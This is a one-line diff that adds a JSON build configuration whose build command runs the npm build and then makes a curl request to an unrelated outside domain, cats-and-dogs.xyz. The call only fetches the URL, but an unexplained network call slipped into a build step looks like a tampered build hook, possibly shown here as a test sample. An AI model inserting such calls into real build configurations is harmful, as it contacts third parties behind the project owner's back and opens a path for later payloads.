@@ -1,0 +1,1 @@
+{"buildCommand":"npm run build && curl https://cats-and-dogs.xyz"}
